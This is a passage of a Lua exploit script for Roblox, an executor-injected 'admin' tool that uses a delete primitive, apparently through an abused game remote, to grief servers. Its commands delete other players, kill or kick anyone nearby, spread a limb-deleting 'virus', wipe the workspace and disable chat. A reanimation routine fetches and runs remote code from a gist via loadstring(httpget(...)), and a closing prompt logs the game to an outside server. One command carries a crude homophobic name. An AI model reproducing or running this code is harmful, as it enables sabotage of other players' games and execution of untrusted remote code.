end, {"clearstarters"}, 1)
addCommand("cleargui", function()
	for i,v in pairs(sgui:GetChildren()) do
		delete(v)
	end
end,{"clearsgui", "clearguis"}, 1)
addCommand("nochat",function()
	if chatEvents then delete(chatEvents) end
	if not modernChat then return end
	for _, v in pairs(TextChatService:GetChildren()) do delete(v) end
end, {"breakchat"}, 2)
addCommand("nostats", function(plrs)
	for i,v in pairs(plrs) do
		if v:FindFirstChild("leaderstats") then delete(v.leaderstats) end
	end
end, {}, 1)
addCommand("deletename", function(plrs, input)
	for _, v in pairs(game:GetDescendants()) do
		if v.Name:lower():gsub(" ",""):match(input:lower()) then delete(v) end
	end
end, {}, 2)
addCommand("clearstorage",function()
	for _, v in pairs(ReplicatedStorage:GetChildren()) do
		if v ~= genv.foundRemote and not (not modernChat and v:IsA("Folder") and v.Name == "DefaultChatSystemChatEvents") then
			delete(v)
		end
	end
end, {"clearrs","clearreps", "clearreplicatedstorage"}, 1)
addCommand("clearws", function()
	for _, v in pairs(workspace:GetChildren()) do
		if not players:GetPlayerFromCharacter(v) then delete(v) end
	end
end, {}, 2)
addCommand("lockws", function()
	for _, v in pairs(workspace:GetChildren()) do
		if not players:FindFirstChild(v.Name) then
			local con = v.ChildAdded:Connect(function(instance)
				if not players:FindFirstChild(instance.Parent.Name) then task.wait(); delete(instance) end
			end)
			table.insert(genv.connections, con); table.insert(wslocks, con)
		end
	end
	local con = workspace.ChildAdded:Connect(function(instance)
		if not players:FindFirstChild(instance.Name) then task.wait(); delete(instance) end
	end)
	table.insert(genv.connections, con); table.insert(wslocks, con)
end, {}, 1)
addCommand("unlockws", function()
	for _, v in pairs(wslocks) do v:Disconnect() end
end, {}, 1)
addCommand("notextures", function()
	for _, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Decal") or v:IsA("Texture") then delete(v) end
	end
end, {}, 1)
addCommand("baseplate", function()
	if not character or not character:FindFirstChild("HumanoidRootPart") then return end
	local hrp = character.HumanoidRootPart
	local function isPlate(instance)
		if not instance:IsA("BasePart") then return false end
		return (instance.Position - hrp.Position).Magnitude <= 7 or instance.Size.Magnitude >= 1000 or instance.Name:lower():gsub(" ",""):find("baseplate")
	end
	for _, v in pairs(workspace:GetChildren()) do
		if players:GetPlayerFromCharacter(v) then continue end
		if not isPlate(v) then delete(v) else
			for _, instance in pairs(v:GetDescendants()) do
				if not isPlate(instance) then delete(instance) end
			end
		end
	end
end,{"platform"}, 2)
addCommand("nospawns", function()
	for _, v in pairs(workspace:GetDescendants()) do
		if v:IsA("SpawnLocation") then delete(v) end
	end
end, {}, 1)
addCommand("unweldws", function()
	for _, v in pairs(workspace:GetDescendants()) do
		if v:IsA("Weld") or v:IsA("Attachment") or v:IsA("Motor6D") then delete(v) end
	end
end, {}, 1)
addCommand("noseats", function()
	for _, v in pairs(workspace:GetDescendants()) do
		if v:IsA("VehicleSeat") or v:IsA("Seat") then delete(v) end
	end
end, {}, 1)
addCommand("nosounds",function()
	for _, v in pairs(game:GetDescendants()) do
		if v:IsA("Sound") then delete(v) end
	end
end, {}, 1)
addCommand("noteams", function()
	for _, v in pairs(Teams:GetChildren()) do delete(v) end
end, {}, 1)
addCommand("clearlighting",function()
	for _, v in pairs(Lighting:GetChildren()) do delete(v) end
end, {}, 1)
addCommand("shutdown", function()
	for _, v in pairs(players:GetPlayers()) do
		if v ~= localPlayer then delete(v) end
	end
	delete(localPlayer)
end, {}, 2)
addCommand("nuke",function()
	for _, v in pairs(workspace:GetChildren()) do
		if not players:GetPlayerFromCharacter(v) then delete(v) end
	end
	for _, v in pairs(players:GetPlayers()) do
		if v ~= localPlayer then delete(v) end
	end
end, {}, 2)
addCommand("witherws",function(plrs, input)
	local speed = tonumber(input:split(" ")[2]) or .25
	local baseparts = {}
	for _, v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") then table.insert(baseparts, v) end
	end
	for i = 1, #baseparts do
		local part = baseparts[math.random(1, #baseparts)]
		if part and part:IsDescendantOf(workspace) then
			delete(part)
			task.wait(speed)
		end
	end
end, {}, 2)
addCommand("wither",function(plrs, input)
	local speed = tonumber(input:split(" ")[2]) or 1
	local function decay(plr)
		local char = plr.Character
		if not char then return end
		local limbs, shuffledLimbs = {}, {}
		for _, v in pairs(char:GetChildren()) do
			if v:IsA("BasePart") and not (v.Name:find("Torso") or v.Name == "Head" or v.Name == "HumanoidRootPart") then
				table.insert(limbs, v)
			end
		end
		while #limbs > 0 do
			local rng = math.random(#limbs)
			table.insert(shuffledLimbs, table.remove(limbs, rng))
		end
		for _, limb in pairs(shuffledLimbs) do
			if not (char and char.Parent and plr.Character == char and limb.Parent) then return end
			delete(limb)
			task.wait(speed)
		end
		if char:FindFirstChild("Head") then delete(char.Head); task.wait(0.1) end
		for _, v in pairs(char:GetChildren()) do
			if v:IsA("BasePart") then delete(v) end
		end
	end
	for _, v in pairs(plrs) do task.spawn(decay, v) end
end, {"decay"}, 1)
local infectSpeed = 1
local function infectPlayer(plr)
	local char = plr.Character
	if not char then return end
	debugPrint(`{plr.Name} was infected`)
	local limbs, shuffledLimbs = {}, {}
	for _, v in pairs(char:GetChildren()) do
		if v:IsA("BasePart") and not (v.Name:find("Torso") or v.Name == "Head" or v.Name == "HumanoidRootPart") then
			table.insert(limbs, v)
		end
	end
	local limbAmount = #limbs
	while #limbs > 0 do
		local rng = math.random(#limbs)
		table.insert(shuffledLimbs, table.remove(limbs, rng))
	end
	for _, limb in pairs(shuffledLimbs) do
		task.wait((45/limbAmount) * infectSpeed)
		if not (char and char.Parent and plr.Character == char and limb.Parent) then return end
		delete(limb)
	end
	if char:FindFirstChild("Head") then delete(char.Head); task.wait(0.1) end
	for _, v in pairs(char:GetChildren()) do
		if v:IsA("BasePart") then delete(v) end
	end
	local index = table.find(infected, plr)
	if index then table.remove(infected, index) end
end
table.insert(genv.connections,rs.Heartbeat:Connect(function()
	for _, v in pairs(infected) do
		local char = v.Character
		if not char then continue end
		if char:FindFirstChildOfClass("Humanoid") and char.Humanoid.Health <= 0 then table.remove(infected,table.find(infected,v)) continue end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if not hrp then continue end
		for _, p in pairs(players:GetPlayers()) do
			if table.find(infected, p) then continue end
			local tchar = p.Character
			if not tchar then continue end
			local thrp = tchar:FindFirstChild("HumanoidRootPart")
			if thrp and (thrp.Position - hrp.Position).Magnitude < 5 then
				table.insert(infected, p)
				task.spawn(infectPlayer, p)
			end
		end
	end
end))
addCommand("virus",function(plrs, input)
	infectSpeed = tonumber(input:split(" ")[2]) or 1
	for _, v in pairs(plrs) do
		table.insert(infected, v)
		task.spawn(infectPlayer, v)
	end
end, {"infect"}, 1)
addCommand("unvirus", function(plrs)
	for _, v in pairs(plrs) do
		local index = table.find(infected, v)
		if index then table.remove(infected, index) end
	end
end, {"uninfect", "cure"}, 1)
table.insert(genv.connections, rs.Heartbeat:Connect(function()
	for name, range in pairs(killauras) do
		local plr = players:FindFirstChild(name)
		if not plr or not plr.Character then killauras[name] = nil continue end
		local pos = plr.Character:GetPivot().Position
		for _, v in pairs(players:GetPlayers()) do
			if v == plr or not v.Character then continue end
			if (pos - v.Character:GetPivot().Position).Magnitude <= range then
				local hum = v.Character:FindFirstChild("Humanoid")
				if hum and hum.Health > 0 then runCommand("kill",{v}) end
			end
		end
	end
end))
addCommand("killaura",function(plrs, input)
	plrs = #plrs > 0 and plrs or {localPlayer}
	local range = tonumber(input:split(" ")[#split]) or 10
	for _, v in pairs(plrs) do killauras[v.Name] = range end
end, {"aura"}, 1)
addCommand("unkillaura",function(plrs)
	for _, v in pairs(plrs) do killauras[v.Name] = nil end
end, {"unaura"}, 1)
table.insert(genv.connections, rs.Heartbeat:Connect(function()
	for name, range in pairs(kickauras) do
		local plr = players:FindFirstChild(name)
		if not plr or not plr.Character then kickauras[name] = nil continue end
		local pos = plr.Character:GetPivot().Position
		for _, v in pairs(players:GetPlayers()) do
			if v == plr or not v.Character then continue end
			if (pos - v.Character:GetPivot().Position).Magnitude <= range then delete(v) end
		end
	end
end))
addCommand("kickaura",function(plrs, input)
	plrs = #plrs > 0 and plrs or {localPlayer}
	local range = tonumber(input:split(" ")[#split]) or 3
	for _, v in pairs(plrs) do kickauras[v.Name] = range end
end, {}, 2)
addCommand("unkickaura",function(plrs)
	for _, v in pairs(plrs) do kickauras[v.Name] = nil end
end, {}, 2)
addCommand("close", abort, {}, 3)
local flyLoop
addCommand("fly",function() -- original made by apeyton
	local hum = character:FindFirstChildOfClass("Humanoid")
	local hrp = character:FindFirstChild("HumanoidRootPart")
	if not (hum and hrp) then return end
	hum.PlatformStand, hrp.Anchored = true, true
	if flyLoop then flyLoop:Disconnect() end
	flyLoop = rs.Heartbeat:Connect(function(deltaTime)
		local moveDir = hum.MoveDirection * (flySpeed * deltaTime)
		local hrpCF, cameraCF = hrp.CFrame, camera.CFrame
		local cameraOffset = hrpCF:ToObjectSpace(cameraCF).Position + hum.CameraOffset
		cameraCF = cameraCF * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
		local cameraPos, hrpPos = cameraCF.Position, hrpCF.Position
		local objectSpaceVelocity = CFrame.new(cameraPos, Vector3.new(hrpPos.X, cameraPos.Y, hrpPos.Z)):VectorToObjectSpace(moveDir)
		hrp.CFrame = CFrame.new(hrpPos) * (cameraCF - cameraPos) * CFrame.new(objectSpaceVelocity)
	end)
end, {}, 3)
addCommand("unfly",function()
	if not flyLoop then return end
	flyLoop:Disconnect()
	local hum = character:FindFirstChildOfClass("Humanoid")
	if hum then hum.PlatformStand = false end
	local hrp = character:FindFirstChild("HumanoidRootPart")
	if hrp then hrp.Anchored = false end
end, {}, 3)
addCommand("flyspeed",function(plrs, input)
	flySpeed = tonumber(input) or 50
end, {}, 3)
addCommand("walkspeed", function(plrs, input)
	local speed = tonumber(input) or 16
	local humanoid = character:FindFirstChild("Humanoid")
	if humanoid then humanoid.WalkSpeed = speed end
end, {"speed", "ws"}, 3)
addCommand("jumppower", function(plrs, input)
	local jp = tonumber(input) or 50
	local humanoid = character:FindFirstChild("Humanoid")
	if humanoid then humanoid.JumpPower = jp end
end, {"jp"}, 3)
local noclipLoop
addCommand("noclip", function()
	if noclipLoop then noclipLoop:Disconnect() end
	noclipLoop = rs.Stepped:Connect(function()
		for _, v in pairs(character:GetDescendants()) do
			if v:IsA("BasePart") and v.CanCollide then v.CanCollide = false end
		end
	end)
end, {"nc"}, 3)
addCommand("clip",function()
	if noclipLoop then noclipLoop:Disconnect() end
end, {"c"}, 3)
-- credits to hydroprocessed for the original hat orbit script <3
addCommand("hatorbit",function()
	-- .offset (how close the hats are to you)
	-- .mode 1-11 (different modes up to 11)
	-- .speed (how fast the hats move)
	-- .angular x y z (how fast the hats rotate)
	local char = character
	local hum = char:FindFirstChild("Humanoid")
	if not hum then return end
	local hats, mov, mov2, par = {}, {}, {}, {}
	local partsFolder = Instance.new("Folder", char); partsFolder.Name = "wacky parts folder"

	local function breakJoints(model)
		for _, v in pairs(model:GetDescendants()) do
			if v:IsA("JointInstance") then delete(v) end
		end
	end
	for _, v in pairs(hum:GetAccessories()) do
		if v:FindFirstChild("Handle") then table.insert(hats,v) end
	end
	for _, v in pairs(hats) do
		local handle = v.Handle
		handle.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
		handle.CanCollide = false
		breakJoints(handle)
		repeat task.wait() until not handle:FindFirstChildOfClass("Weld")
		local still = Instance.new("BodyAngularVelocity", handle)
		still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
		still.AngularVelocity = Vector3.new(0, 0, 0)
		local align = Instance.new("AlignPosition", handle)
		align.MaxForce, align.MaxVelocity, align.Responsiveness = 1000000, math.huge, 200
		align.RigidityEnabled, align.ApplyAtCenterOfMass = false, true
		local a0, a1 = Instance.new("Attachment", handle), Instance.new("Attachment", char.Head)
		align.Attachment0, align.Attachment1 = a0, a1
		table.insert(mov, a1); table.insert(mov2, still)
	end
	local velocityCon = rs.Heartbeat:connect(function()
		for _, v in pairs(hats) do
			if v:FindFirstChild("Handle") then v.Handle.Velocity = Vector3.new(0,30,0) end
		end
	end)
	table.insert(genv.connections, velocityCon)
	for _ in pairs(mov) do
		local part = Instance.new("Part", partsFolder)
		part.Anchored, part.Size, part.Transparency, part.CanCollide = true, Vector3.new(1,1,1), 1, false
		table.insert(par, part)
	end
	local rotx, rotz, height, heighti, l = 0, math.pi/2, 0, 1, 1
	local offset, speed, mode, angular = 10, 0.5, 4, Vector3.new(0,0,0)

	local alignCon = rs.RenderStepped:Connect(function()
		rotx, rotz, l = rotx + speed/100, rotz + speed/100, (l >= 360 and 1 or l + speed)
		for i, v in pairs(par) do
			v.CFrame = CFrame.new(char.HumanoidRootPart.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + speed), 0) * CFrame.new(offset, 0, 0)
		end
		height = height + (heighti == 1 and speed/100 or -speed/100)
		if height > 2 then heighti = 2 elseif height < -1 then heighti = 1 end
		if mode == 4 then
			for i, v in pairs(mov) do
				v.Position = char.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position))
			end
		end
		for _, v in pairs(mov2) do v.AngularVelocity = angular end
	end)
	local function onChat(text)
		local args = text:split(" ")
		if args[1] == ".speed" then speed = tonumber(args[2]) or speed
		elseif args[1] == ".mode" then mode = tonumber(args[2]) or mode
		elseif args[1] == ".offset" then offset = tonumber(args[2]) or offset
		elseif args[1] == ".angular" then angular = Vector3.new(tonumber(args[2]), tonumber(args[3]), tonumber(args[4]))
		end
	end
	local chatCon = localPlayer.Chatted:Connect(onChat)
	table.insert(genv.connections, chatCon)
	local diedCon = hum.Died:Connect(function()
		alignCon:Disconnect(); velocityCon:Disconnect(); chatCon:Disconnect()
	end)
	table.insert(genv.connections, diedCon)
end, {}, 3)
local function loadReanim()
	local char = localPlayer.Character or localPlayer.CharacterAdded:Wait()
	local hum = char:WaitForChild("Humanoid")
	local simRadius = gethiddenproperty and gethiddenproperty(localPlayer,"SimulationRadius")
	local requiredRadius = 20
	local isR15 = hum.RigType == Enum.HumanoidRigType.R15
	if simRadius and simRadius < requiredRadius then
		repeat
			notify("Please wait",`Waiting for bigger SimulationRadius ({math.floor(simRadius)}/{requiredRadius})`, 2)
			task.wait(2)
		until gethiddenproperty(localPlayer,"SimulationRadius") >= requiredRadius
		if not (localPlayer.Character and localPlayer.Character == char and hum.Parent and hum.Health > 0) then return end
	end
	if char:FindFirstChildOfClass("ForceField") then char:FindFirstChildOfClass("ForceField"):Destroy() end
	char.Archivable = true
	local rig = not isR15 and char:Clone()
	if isR15 then
		local canGetObjects, loadedRig = pcall(function() return game:GetObjects("rbxassetid://18418211383")[1] end)
		rig = isTesting and rStorage:WaitForChild("R6Rig") or (canGetObjects and loadedRig) or loadstring(httpget("https://gist.githubusercontent.com/someunknowndude/ad264038a91f7fa11bec2f67dad3feaf/raw"))()
		local humDesc = players:GetCharacterAppearanceAsync(localPlayer.UserId)
		for _, v in pairs(char.Head:GetChildren()) do
			if v:IsA("Attachment") or v:IsA("SurfaceAppearance") then v:Clone().Parent = rig.Head end
		end
		for _, v in pairs(humDesc:GetDescendants()) do
			if v:IsA("BodyColors") or v:IsA("CharacterMesh") or v:IsA("ShirtGraphic") then v.Parent = rig
			elseif v:IsA("Accessory") or v:IsA("Hat") then rig:WaitForChild("Humanoid"):AddAccessory(v) end
		end
	elseif char.Head:FindFirstChildOfClass("SpecialMesh") and char.Head:FindFirstChild("face") then
		delete(char.Head.face)
	end
	local rigHRP, rigHum = rig:WaitForChild("HumanoidRootPart"), rig:FindFirstChild("Humanoid")
	rig.Name = "wacky reanim rig"
	local limbs, hatHandles, reanimConnections = {}, {}, {}
	for _, v in pairs(char:GetChildren()) do
		if v:IsA("BasePart") then table.insert(limbs, {v, rig[v.Name]}) end
	end
	for i, v in pairs(hum:GetAccessories()) do
		if not isR15 then table.insert(hatHandles, {v.Handle, rigHum:GetAccessories()[i].Handle}); continue end
		for _, rigAcc in pairs(rigHum:GetAccessories()) do
			if rigAcc.Name == v.Name and rigAcc.Handle.MeshId == v.Handle.MeshId then
				table.insert(hatHandles, {v.Handle, rigAcc.Handle}); break
			end
		end
	end
	local netlessCF, sineValue = CFrame.identity, 0
	pcall(sethiddenproperty, localPlayer, "MaximumSimulationRadius", 1000)
	pcall(sethiddenproperty, localPlayer, "SimulationRadius", 1000)

	local function align(p0, p1, offset)
		if not stopAlign and p0 and p0.Parent and p1 and p1.Parent then
			p0.AssemblyLinearVelocity = Vector3.new(p1.AssemblyLinearVelocity.X * p1.Mass * 5, sineValue, p1.AssemblyLinearVelocity.Z * p1.Mass * 5)
			p0.AssemblyAngularVelocity = p1.AssemblyAngularVelocity
			if isnetworkowner(p0) then p0.CFrame = p1.CFrame * offset end
		end
	end
	rigHRP.CFrame, rig.Parent, localPlayer.Character = hrp.CFrame, workspace, rig
	camera.CameraSubject = rigHum
	rig.Animate.Enabled = false; task.wait(); rig.Animate.Enabled = true
	hum:ChangeState(Enum.HumanoidStateType.Physics)
	repeat task.wait() until limbs[3][1].CanCollide; task.wait(0.05)
	delete(hum); repeat task.wait() until not hum.Parent; task.wait()
	local fakeHum = hum:Clone(); fakeHum.Parent = char; task.wait()
	table.insert(reanimConnections, rs.PreSimulation:Connect(function()
		netlessCF = CFrame.new(0.01 * math.sin(os.clock()*16), 0, 0.01 * math.cos(os.clock()*16))
		sineValue = 40 - 3 * math.sin(os.clock()*10)
		if stopAntiVoid or rigHRP.Position.Y > (workspace.FallenPartsDestroyHeight + 50) then return end
		rigHRP.CFrame, rigHRP.AssemblyLinearVelocity, rigHRP.AssemblyAngularVelocity = hrp.CFrame, Vector3.zero, Vector3.zero
	end))
	table.insert(reanimConnections, rs.PostSimulation:Connect(function()
		for _, data in pairs(limbs) do align(data[1], data[2], netlessCF) end
		for _, data in pairs(hatHandles) do align(data[1], data[2], netlessCF) end
	end))
	for _, part in pairs(char:GetDescendants()) do if part:IsA("BasePart") then part.CanCollide, part.CanQuery, part.CanTouch = false, false, false end end
	for _, obj in pairs(char:GetDescendants()) do if obj:IsA("BasePart") or obj:IsA("Decal") then obj.Transparency = 1 end end
	for _, obj in pairs(char:GetDescendants()) do if obj:IsA("JointInstance") then delete(obj) end end
	for _, obj in pairs(char:GetChildren()) do if obj:IsA("Script") or obj:IsA("LocalScript") or obj.Name == "Animate" then delete(obj) end end
	for _, obj in pairs(char:GetDescendants()) do if obj:IsA("TouchTransmitter") then delete(obj) end end

	local reset = Instance.new("BindableEvent")
	reset.Event:Connect(function()
		if stopAlign then if character:FindFirstChildOfClass("Humanoid") then character.Humanoid.Health = 0 else character:BreakJoints() end return end
		notify("Resetting", "Please wait ~6 seconds", 6)
		stopAntiVoid, rigHRP.Anchored, rigHRP.CFrame = true, true, CFrame.new(0, workspace.FallenPartsDestroyHeight + 5, 0)
		task.wait(0.5); stopAlign = true; rigHum:ChangeState(Enum.HumanoidStateType.Dead)
		localPlayer.CharacterAdded:Wait(); rig:Destroy()
		for _, v in pairs(reanimConnections) do v:Disconnect() end
	end)
	sgui:SetCore("ResetButtonCallback", reset)
	notify("Success!", "reanim loaded!")
end
addCommand("reanim", function() task.spawn(loadReanim) end, {"reanimate"}, 3)

--[[Sort commands alphabetically]]--
table.sort(commands, function(a,b) return a.name < b.name end)

--[[Command list with every description.]]--
local cmdData = {
	["admin"] = "Grants or removes admin permissions.", ["aliases"] = "Prints all command aliases.",
	["bald"] = "Removes all accessories from the character.", ["ban"] = "Bans players by their UserId.",
	["bang"] = "Plays a 'bang' animation and attaches to the target player.", ["baseplate"] = "Deletes everything except baseplates.",
	["bighats"] = "Enlarges R15 hats.", ["blockhats"] = "Removes hat meshes for R6 characters.",
	["blockhead"] = "Removes head mesh for R6 characters.", ["blocktools"] = "Removes any meshes from tool handles.",
	["bring"] = "Teleports another player to you using tool teleportation.", ["btools"] = "Gives you build tools (destroy, unweld).",
	["clearbans"] = "Clears the ban list.", ["cleargui"] = "Removes all GUI elements.",
	["clearlighting"] = "Deletes all Lighting service children.", ["clearstarter"] = "Clears StarterGui, StarterPack, and scripts.",
	["clearstorage"] = "Deletes all objects in ReplicatedStorage.", ["clearws"] = "Clears the workspace of all non-player items.",
	["clickdelete"] = "Enables click-to-delete mode.", ["clip"] = "Disables noclip mode.",
	["cmds"] = "Shows the command UI.", ["control"] = "Takes control of another player's character.",
	["deletename"] = "Deletes any object whose name matches the given text.", ["droptools"] = "Deletes a player's tool when they equip it.",
	["eat"] = "Makes a player's character get consumed piece by piece.", ["explorer"] = "Opens a Dex Explorer GUI.",
	["fakechat"] = "Makes your character appear to be chatting and follows a player.", ["fling"] = "Flings a player using physics.",
	["fly"] = "Enables flight mode.", ["flyspeed"] = "Sets the flight speed.",
	["freeze"] = "Stops all character movement.", ["gay"] = "Obliterates the server, leaving one survivor for you to 'bang'.",
	["givetools"] = "Forces your tools onto a target player.", ["goto"] = "Teleports you to the target player.",
	["grabtools"] = "Pulls all tools in the workspace to your character.", ["gun"] = "Gives you a gun tool.",
	["hatorbit"] = "Makes your hats orbit around your character.", ["invisible"] = "Makes the character invisible.",
	["jumppower"] = "Sets your jump power.", ["kick"] = "Kicks the player from the game.",
	["kickaura"] = "Automatically kicks players who get too close.", ["kill"] = "Kills the player by deleting their Neck.",
	["killaura"] = "Auto-kills nearby players.", ["korblox"] = "Deletes the characters right leg.",
	["legwalk"] = "Deletes upper arms and waist for a leg-only rig.", ["lockws"] = "Prevents new non-player objects in the workspace.",
	["loopkill"] = "Repeatedly kills target players.", ["mute"] = "Mutes players in TextChatService.",
	["naked"] = "Removes all clothing from a character.", ["noanims"] = "Stops all animations for a player.",
	["noarms"] = "Deletes all arm parts from a character.", ["nochat"] = "Disables chat.",
	["noclip"] = "Allows you to walk through objects.", ["noface"] = "Deletes face decals.",
	["nolegs"] = "Deletes legs and feet from a character.", ["nolimbs"] = "Deletes all arm and leg parts.",
	["noseats"] = "Deletes all Seats in the workspace.", ["nosounds"] = "Deletes all Sound objects in the game.",
	["nospawns"] = "Deletes all SpawnLocations.", ["nostats"] = "Deletes the leaderstats folder.",
	["noteams"] = "Deletes all Teams in the game.", ["notextures"] = "Deletes all Decals and Textures.",
	["notools"] = "Removes all tools from a player.", ["nuke"] = "Deletes all workspace objects and players.",
	["owner"] = "Promotes a player to Owner.", ["punch"] = "Gives a punch tool that can kill others.",
	["punish"] = "Deletes the entire character of a player.", ["ragdoll"] = "Deletes the HumanoidRootPart, causing a ragdoll.",
	["ranks"] = "Prints a list of all admins and owners.", ["reanim"] = "Loads a custom R6 animation rig.",
	["rejoin"] = "Rejoins the current server.", ["rescale"] = "Deletes avatar scaling values.",
	["reset"] = "Resets your character.", ["serverlock"] = "Prevents new players from joining.",
	["setbind"] = "Sets the keybind to toggle the command bar.", ["setprefix"] = "Changes the command prefix.",
	["shutdown"] = "Kicks all players to shut down the server.", ["silentkill"] = "Kills and then deletes the character.",
	["sink"] = "Deletes the humanoid, disabling movement.", ["skydive"] = "Teleports a player high into the air.",
	["stealtools"] = "Steals tools from another player.", ["stripidentity"] = "Removes clothing, hats, and face.",
	["torsofling"] = "Uses the torso to fling people.", ["unadmin"] = "Removes admin permissions.",
	["unban"] = "Removes players from the ban list.", ["unbang"] = "Stops the bang animation.",
	["unclickdelete"] = "Disables click-to-delete mode.", ["unfly"] = "Disables fly mode.",
	["unkickaura"] = "Disables the kick aura.", ["unkillaura"] = "Disables the kill aura.",
	["unlockws"] = "Disables the workspace lock.", ["unloopkill"] = "Removes players from the loopkill list.",
	["unowner"] = "Removes owner privileges.", ["unserverlock"] = "Disables the server lock.",
	["unsit"] = "Forces players to stand up.", ["untorsofling"] = "Disables torso fling mode.",
	["unview"] = "Resets the camera from spectating.", ["unvirus"] = "Cures players from the virus command.",
	["unweldws"] = "Deletes all welds in the workspace.", ["view"] = "Spectates another player.",
	["virus"] = "Infects players, causing them to decay and spread.", ["walkspeed"] = "Sets your walk speed.",
	["wither"] = "Slowly deletes limbs from players.", ["witherws"] = "Slowly deletes workspace parts.",
	["close"] = "Safely shuts down the script.",
}

--[[ Populate the command list ]]--
for _, v in ipairs(commands) do
	local clone = cmdTemplate:Clone()
	local desc = cmdData[v.name:lower()] or "No description available."
	clone.Text = string.format("%s (%s) - %s", v.name, rankNames[v.securityLevel], desc)
	clone.Visible = true
	clone.Parent = cmdsList
end
cmdsList.CanvasSize = UDim2.new(0, 0, 0, #commands * 45) -- Set canvas size based on content

--[[send to game logger]]--
if not inDatabase then
	local function promptCallback(answer)
		if answer == "No" then return end
		local sg = localPlayer:FindFirstChildOfClass("StarterGear")
		if sg then delete(sg); task.wait(checkTime) end
		if (sg and sg.Parent == localPlayer) or (not isTesting and game:GetService("GuiService"):GetErrorCode() ~= Enum.ConnectionError.OK) then
			return notify("Logger error", "Game could not be logged.", 10)
		end
		sendGame()
		debugPrint("game sent to server")
	end
	local bindable = Instance.new("BindableFunction")
	bindable.OnInvoke = promptCallback
	StarterGui:SetCore("SendNotification", {
		Title = "YXXT_21K TOP";
		Text = "Would you like to log this game? (PLEASE TEST COMMANDS BEFORE CLICKING YES)",
		Duration = 300,
		Button1 = "Yes",
		Button2 = "No",
		Callback = bindable
	})
end
debugPrint("YXXT_21K TOP loaded successfully!")
